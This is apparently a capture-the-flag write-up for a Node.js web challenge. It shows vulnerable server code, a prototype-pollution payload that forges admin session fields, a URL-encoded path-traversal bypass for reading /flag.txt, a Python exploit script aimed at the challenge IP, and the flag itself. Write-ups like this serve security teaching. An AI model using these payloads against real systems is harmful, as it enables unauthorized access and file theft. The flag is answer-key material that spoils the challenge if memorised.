# Welcome Christmas

### Category

Web

### Description

![alt](images/1.png)

### Solution

In the previous challenge, we were able to get a github repo, as well as a token. We will be able to download the repo to access the source code of this last application. Before the beginning of this challenge, I had two theories:
- We will have to make a malicious PR allowing to execute code on the machine which hosts the challenge
- The application we are going to get is hosted on a web server, and we will have to do a last exploit to read a file.

When we get the github repo, I will first see the file "docker-compose.yml", here, we can see a commented line that links us to the link where the server is hosted (http://54.157.87.12), so we leave on a web exploit to read a file.

After a quick read of the "index.js" source code, I notice the "/guinjutsu" endpoint :

```js
app.post("/guinjutsu",function(req,res){
	const filter={};
	merge(filter,req.body);
	console.log(req.session.isAdmin,req.session.username);
	if(req.session.isAdmin && req.session.username){
	var filename=req.body.filename;
	if (filename.includes("../")){
		return res.send("No No Sorry");
	}
	else{
		filename=querystring.unescape(filename);
		const data = fs.readFileSync(path.normalize("./"+filename), 'utf8');
		return res.send(data);
	}
	}
	else{
		res.send("Not Authorized");
	}
});
```

Having already done prototype pollution challenges in nodejs, I know that the merge() function is vulnerable (in a certain version of the package), to prototype pollution, and I suspect that it is the one used here.

So we can pollute our object to have a username and a valid isAdmin attribute :
```
{"__proto__":{"isAdmin":1,"username":"worty"}}
```

Here (by laziness) I will pollute all the objects directly rather than the one of the session.

Now we have to succeed in reading the file "/flag.txt", but there is a small filter on "../", but in its code, it uses the unescape function which allows to transform the encoded characters into valid characters (%2E => .).

So we will pass in parameter of the file to read "%2E%2E%2Fflag.txt" !

Again I made a small script in python that it does it and shows me the result :
```py
import requests
url = "http://54.157.87.12/guinjutsu"
res = requests.post(url=url,data={"__proto__":{"isAdmin":1,"username":"worty"},"filename":"%2E%2E%2Fflag.txt"})
print(res.text)
```

### Flag

Yogosha{You_Have_Really_Nailed_IT_And_Saved_Konoha}